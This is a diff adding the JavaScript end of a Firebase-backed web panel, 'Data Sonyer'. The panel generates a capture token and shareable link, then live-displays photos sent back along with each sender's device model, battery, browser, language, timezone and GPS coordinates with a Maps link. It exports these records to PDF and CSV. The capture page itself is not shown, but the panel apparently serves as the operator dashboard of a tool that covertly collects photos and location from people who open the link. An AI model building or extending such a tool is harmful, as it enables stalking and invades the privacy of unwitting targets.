+      pdf.setFontSize(12);
+      pdf.text('Sin foto disponible', imgAreaX + 26, imgAreaY + 96);
+    }
+
+    const infoX = imgAreaX + imgAreaW + 18;
+    const infoW = cardW - (infoX - cardX) - 18;
+    pdf.setFillColor(24,31,63);
+    pdf.roundedRect(infoX, imgAreaY, infoW, 185, 14, 14, 'F');
+    pdf.setTextColor(255,255,255);
+    pdf.setFont('helvetica','bold');
+    pdf.setFontSize(13);
+    pdf.text('Correo y datos', infoX + 14, imgAreaY + 20);
+    pdf.setFont('helvetica','normal');
+    pdf.setFontSize(10.5);
+    const lines = [
+      `Correo: ${x.correo}`,
+      `Modelo: ${x.model}`,
+      `Batería: ${x.battery} · Cargando: ${x.charging}`,
+      `Pantalla: ${x.screenSize} · Vista: ${x.viewport}`,
+      `Conexión: ${x.conn} · Online: ${x.online}`,
+      x.lat !== null && x.lng !== null ? `Ubicación: ${x.lat}, ${x.lng} · ±${x.acc}m` : 'Ubicación: No guardado',
+      x.map ? `Maps: ${x.map}` : '',
+      `Idioma: ${x.lang} · Zona: ${x.zone}`,
+      `Sistema: ${x.system}${x.version ? ' · v ' + x.version : ''}`,
+      `Navegador: ${x.browser}`
+    ].filter(Boolean);
+    let ty = imgAreaY + 40;
+    lines.forEach(line=>{
+      const parts = pdf.splitTextToSize(line, infoW - 24);
+      pdf.text(parts, infoX + 12, ty);
+      ty += parts.length * 13 + 4;
+    });
+
+    const footerY = imgAreaY + 205;
+    pdf.setFillColor(24,31,63);
+    pdf.roundedRect(imgAreaX, footerY, cardW - 36, 86, 14, 14, 'F');
+    pdf.setFont('helvetica','bold');
+    pdf.setFontSize(12.5);
+    pdf.setTextColor(255,255,255);
+    pdf.text('Resumen', imgAreaX + 14, footerY + 22);
+    pdf.setFont('helvetica','normal');
+    pdf.setFontSize(11);
+    const footerLines = [
+      `Acción: ${x.accion}`,
+      `Fecha: ${x.fecha}`,
+      `Archivo: ${x.item}`
+    ];
+    pdf.text(footerLines, imgAreaX + 14, footerY + 42);
+    pdf.setFontSize(9.5);
+    pdf.setTextColor(180,188,218);
+    pdf.text('Generado desde Data Sonyer', imgAreaX + 14, pageH - 40);
+    const safeDate = new Date().toISOString().slice(0,19).replace(/[T:]/g,'-');
+    pdf.save(`data_sonyer_${safeDate}.pdf`);
+    showToast('PDF descargado.');
+  }catch(e){
+    console.error(e);
+    showToast('No se pudo descargar PDF.', 'error');
+  }
+}
+
+
+function getPanelDeviceId(){
+  let id = localStorage.getItem("panel_device_id");
+  if(!id){
+    id = crypto?.randomUUID ? crypto.randomUUID() : "dev_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2);
+    localStorage.setItem("panel_device_id", id);
+  }
+  return id;
+}
+
+async function validarCelularUnico(user){
+  const deviceId = getPanelDeviceId();
+  const lockRef = doc(db, "deviceLocks", user.uid);
+  const snap = await getDoc(lockRef);
+  const info = {
+    email: user.email || "",
+    deviceId,
+    ultimoIngreso: serverTimestamp(),
+    navegador: navigator.userAgent || "",
+    idioma: navigator.language || "",
+    pantalla: `${screen.width}x${screen.height}`,
+    zona: Intl.DateTimeFormat().resolvedOptions().timeZone || ""
+  };
+
+  if(!snap.exists()){
+    await setDoc(lockRef, {
+      ...info,
+      fechaRegistro: serverTimestamp()
+    }, { merge:true });
+    return true;
+  }
+
+  const data = snap.data() || {};
+  if(data.deviceId !== deviceId){
+    await showDialog({
+      title:"Celular no autorizado",
+      message:"Este panel <strong>ya está vinculado a otro celular</strong>.<br><br>Para usar este equipo, entra al celular autorizado y toca <strong>Resetear celular autorizado</strong>.",
+      confirmText:"Entendido",
+      showCancel:false,
+      tone:"danger",
+      note:"Así la cuenta solo abre en un celular."
+    });
+    await signOut(auth);
+    return false;
+  }
+
+  await setDoc(lockRef, info, { merge:true });
+  return true;
+}
+
+async function resetearCelularAutorizado(){
+  const user = auth.currentUser;
+  if(!user) return;
+  const ok = await showDialog({
+    title:"Cambiar celular autorizado",
+    message:"Si continúas, <strong>se liberará el celular actual</strong>.<br><br>Después, el próximo celular que inicie sesión quedará autorizado.",
+    confirmText:"Sí, continuar",
+    cancelText:"Cancelar",
+    tone:"warning",
+    note:"Haz esto solo cuando quieras cambiar de teléfono."
+  });
+  if(!ok) return;
+  try{
+    await deleteDoc(doc(db, "deviceLocks", user.uid));
+    localStorage.removeItem("panel_device_id");
+    showToast("Celular autorizado reseteado.");
+    await signOut(auth);
+  }catch(e){
+    console.error(e);
+    showToast("No se pudo resetear. Revisa reglas.", "error");
+  }
+}
+
+async function ensureToken(user){
+  const userRef=doc(db,"users",user.uid);
+  const snap=await getDoc(userRef);
+  if(snap.exists() && snap.data().captureToken) token=snap.data().captureToken;
+  else {token=makeToken();await setDoc(userRef,{uid:user.uid,email:user.email,captureToken:token,createdAt:serverTimestamp()},{merge:true});}
+  await setDoc(doc(db,"shares",token),{ownerUid:user.uid,email:user.email,active:true,token,updatedAt:serverTimestamp()},{merge:true});
+  $("appLink").value=makeAppLink(token);
+}
+
+function startLive(){
+  if(unsub) unsub();
+  if(!token) return;
+  $("live").textContent="LIVE";
+  const q=query(collection(db,"shares",token,"fotos"));
+  unsub=onSnapshot(q,snap=>{
+    const docs = snap.docs.map(d=>({id:d.id,...d.data()}));
+    const incomingIds = new Set(docs.map(p=>p.id));
+    if(bellLoaded){
+      const added = docs.filter(p=>!knownPhotoIds.has(p.id)).length;
+      notifyNewData(added);
+    } else {
+      bellLoaded = true;
+    }
+    knownPhotoIds = incomingIds;
+    photos=docs;
+    photos.sort((a,b)=>dt(b)-dt(a));
+    render();
+    updateBell();
+  },err=>{console.error(err);showToast("No se pudo cargar fotos. Revisa reglas.","error");});
+}
+
+function renderStats(){
+  const today=new Date(); const same=d=>d.getFullYear()===today.getFullYear()&&d.getMonth()===today.getMonth()&&d.getDate()===today.getDate();
+  $("totalCount").textContent=photos.length; $("todayCount").textContent=photos.filter(p=>same(dt(p))).length; $("lastTime").textContent=photos[0]?fmt(photos[0].fecha||photos[0].createdAtLocal,true):"--";
+}
+function filtered(){const q=$("search").value.trim().toLowerCase();return photos.filter(p=>!q||`${p.accion} ${p.item} ${fmt(p.fecha||p.createdAtLocal)} ${imgUrl(p)}`.toLowerCase().includes(q));}
+
+function render(){
+  renderStats();
+  const data=filtered();
+  $("empty").style.display=data.length?"none":"block";
+  $("list").innerHTML=data.map((p,i)=>{
+    const url=imgUrl(p);
+    const img=url?`<img src="${esc(url)}" data-index="${i}" onerror="this.parentElement.innerHTML='Imagen no cargó<br>toca Ver';">`:`Sin URL<br>copia doc`;
+    const view=url?`<a class="btn" href="${esc(url)}" target="_blank">Ver</a><button data-pdf="${esc(p.id)}">Descargar PDF</button><button data-copy="${esc(url)}">Copiar URL</button>`:`<button data-pdf="${esc(p.id)}">Descargar PDF</button><button data-copy="${esc(JSON.stringify(p))}">Copiar doc</button>`;
+    return `<article class="photo"><div class="thumb">${img}</div><div class="meta"><b>${esc(p.item||"Sin item")}</b><span>Acción: ${esc(p.accion||"Sin acción")}</span><span>Fecha: ${esc(fmt(p.fecha||p.createdAtLocal))}</span><span>${url?"URL lista":"No hay campo url"}</span><div class="hidden" id="det-${esc(p.id)}">${detailsHtml(p)}</div><div class="actions">${view}<button data-toggle="${esc(p.id)}">Ver datos</button><button class="green" data-share="${esc(p.id)}">Compartir</button><button class="red" data-del="${esc(p.id)}">Borrar</button></div></div></article>`;
+  }).join("");
+  $("list").querySelectorAll("img").forEach(img=>img.addEventListener("click",()=>openViewer(data[Number(img.dataset.index)])));
+  $("list").querySelectorAll("[data-copy]").forEach(btn=>btn.addEventListener("click",async()=>{await navigator.clipboard.writeText(btn.dataset.copy).catch(()=>{});showToast("Copiado.");}));
+  $("list").querySelectorAll("[data-pdf]").forEach(btn=>btn.addEventListener("click",()=>{const p=photos.find(x=>x.id===btn.dataset.pdf); if(p) downloadPdf(p);}));
+  $("list").querySelectorAll("[data-toggle]").forEach(btn=>btn.addEventListener("click",()=>{const el=$("det-"+btn.dataset.toggle); if(el){el.classList.toggle("hidden"); btn.textContent=el.classList.contains("hidden")?"Ver datos":"Ocultar";}}));
+  $("list").querySelectorAll("[data-share]").forEach(btn=>btn.addEventListener("click",()=>{const p=photos.find(x=>x.id===btn.dataset.share); if(p) shareText(buildText(p));}));
+  $("list").querySelectorAll("[data-del]").forEach(btn=>btn.addEventListener("click",()=>deletePhoto(btn.dataset.del)));
+}
+
+function openViewer(p){const url=imgUrl(p);$("viewerContent").innerHTML=url?`<img src="${esc(url)}"><div class="meta"><b>${esc(p.item||"Sin item")}</b><span>Acción: ${esc(p.accion||"")}</span><span>Fecha: ${esc(fmt(p.fecha||p.createdAtLocal))}</span><span>URL: ${esc(url)}</span>${deviceHtml(p)}</div>`:`<div class="empty" style="display:block">Esta foto no tiene URL.</div>`;$("viewer").classList.add("show");}
+async function deletePhoto(id){
+  if(!token || !id) return;
+  const ok = await showDialog({title:"Borrar foto", message:"¿Seguro que quieres <strong>borrar esta foto</strong> del panel?", confirmText:"Sí, borrar", cancelText:"Cancelar", tone:"danger"}); if(!ok) return;
+  try{ await deleteDoc(doc(db,"shares",token,"fotos",id)); showToast("Foto borrada del panel."); }
+  catch(e){ console.error(e); showToast("No se pudo borrar. Revisa reglas.", "error"); }
+}
+async function deleteAllPhotos(){
+  if(!token || !photos.length){showToast("No hay fotos para borrar.");return;}
+  const ok = await showDialog({title:"Borrar todo", message:"¿Seguro que quieres <strong>borrar todas las fotos</strong> del panel global?", confirmText:"Sí, borrar todo", cancelText:"Cancelar", tone:"danger", note:"Esta acción no se puede deshacer."}); if(!ok) return;
+  try{ await Promise.all(photos.map(p=>deleteDoc(doc(db,"shares",token,"fotos",p.id)))); showToast("Todas las fotos fueron borradas."); }
+  catch(e){ console.error(e); showToast("No se pudo borrar todo. Revisa reglas.", "error"); }
+}
+function shareAllData(){
+  const data=filtered();
+  if(!data.length){showToast("No hay datos para compartir.");return;}
+  shareText(data.map(buildText).join("\n\n----------------\n\n"));
+}
+function exportCSV(){
+  const rows=[["fecha","accion","item","url","modelo","bateria","cargando","pantalla","vista","conexion","latitud","longitud","precision","maps","idioma","zona","sistema","navegador"]];
+  filtered().forEach(p=>{const d=p.deviceInfo||{};rows.push([fmt(p.fecha||p.createdAtLocal),p.accion||"",p.item||"",imgUrl(p),d.model||p.modelo||"",d.batteryPercent||p.bateria||"",d.chargingText||p.cargando||"",d.screen||p.pantalla||"",d.viewport||p.vista||"",d.connectionType||p.conexion||"",d.location?.latitude||p.latitud||"",d.location?.longitude||p.longitud||"",d.location?.accuracy||p.precision||"",d.location?.mapsUrl||p.mapsUrl||"",d.language||p.idioma||"",d.timezone||p.zonaHoraria||"",d.os||p.sistema||d.platform||"",d.browser||p.navegador||""]);});
+  const csv=rows.map(r=>r.map(v=>`"${String(v).replaceAll('"','""')}"`).join(",")).join("\n"); const a=document.createElement("a");a.href=URL.createObjectURL(new Blob([csv],{type:"text/csv;charset=utf-8"}));a.download="fotos_panel.csv";a.click();URL.revokeObjectURL(a.href);
+}
+
+onAuthStateChanged(auth,async user=>{
+  if(user){
+    const permitido = await validarCelularUnico(user).catch(e=>{
+      console.error(e);
+      showToast("No se pudo validar el celular.", "error");
+      return false;
+    });
+    if(!permitido) return;
+
+    $("authCard").classList.add("hidden");
+    $("adminCard").classList.remove("hidden");
+    $("tools").classList.remove("hidden");
+    $("stats").classList.remove("hidden");
+    $("userLabel").textContent="Dueño sonyer · "+user.email;
+    $("emailShow").textContent=user.email;
+    $("uidShow").textContent="UID: "+user.uid;
+    $("avatar").textContent=(user.email||"S").slice(0,1).toUpperCase();
+
+    await ensureToken(user).catch(e=>{
+      console.error(e);
+      showToast("No se pudo generar token.","error");
+    });
+    startLive();
+  } else {
+    if(unsub)unsub();
+    $("authCard").classList.remove("hidden");
+    $("adminCard").classList.add("hidden");
+    $("tools").classList.add("hidden");
+    $("stats").classList.add("hidden");
+    $("live").textContent="OFF";
+    $("userLabel").textContent="Dueño sonyer";
+    photos=[];
+    token="";
+    bellLoaded=false;
+    knownPhotoIds=new Set();
+    newBellCount=0;
+    render();
+    updateBell();
+  }
+});
+$("loginBtn").addEventListener("click",async()=>{try{await signInWithEmailAndPassword(auth,$("email").value.trim(),$("password").value);}catch(e){showToast("No se pudo entrar.","error");}});
+$("registerBtn").addEventListener("click",async()=>{try{await createUserWithEmailAndPassword(auth,$("email").value.trim(),$("password").value);}catch(e){showToast("No se pudo crear.","error");}});
+$("logoutBtn").addEventListener("click",()=>signOut(auth)); $("generateBtn").addEventListener("click",async()=>{if(auth.currentUser){await ensureToken(auth.currentUser);startLive();showToast("Link generado.");}});
+$("resetDeviceBtn").addEventListener("click",resetearCelularAutorizado);
+$("copyBtn").addEventListener("click",async()=>{if(!$("appLink").value&&auth.currentUser)await ensureToken(auth.currentUser);await navigator.clipboard.writeText($("appLink").value).catch(()=>{});showToast("Link copiado.");});
+$("reloadBtn").addEventListener("click",startLive); $("exportBtn").addEventListener("click",exportCSV); $("deleteAllBtn").addEventListener("click",deleteAllPhotos); $("shareAllBtn").addEventListener("click",shareAllData); $("search").addEventListener("input",render); $("linkFileName").addEventListener("input",()=>{if(token)$("appLink").value=makeAppLink(token);});
+$("closeViewer").addEventListener("click",()=>$("viewer").classList.remove("show")); $("viewer").addEventListener("click",e=>{if(e.target===$("viewer"))$("viewer").classList.remove("show");});
+
+
+$("bellBtn").addEventListener("click",toggleBellPanel);
+$("enableSoundBtn").addEventListener("click",enableBellSound);
+$("clearBellBtn").addEventListener("click",clearBellCount);
+soundEnabled = localStorage.getItem("panel_bell_sound") !== "0";
+localStorage.setItem("panel_bell_sound","1");
+updateBell();
+
+
+$("installAppBtn").addEventListener("click",installPWA);
+$("installCloseBtn").addEventListener("click",hideInstallBanner);
+
+function bindDialogButtons(){
+  const okBtn = $("dialogOkBtn");
+  const cancelBtn = $("dialogCancelBtn");
+  const ok = (e)=>{ e.preventDefault(); e.stopPropagation(); closeDialog(true); };
+  const cancel = (e)=>{ e.preventDefault(); e.stopPropagation(); closeDialog(false); };
+  okBtn.addEventListener("click", ok);
+  okBtn.addEventListener("touchend", ok, {passive:false});
+  cancelBtn.addEventListener("click", cancel);
+  cancelBtn.addEventListener("touchend", cancel, {passive:false});
+}
+bindDialogButtons();
+
+</script>
+</body>
+</html>
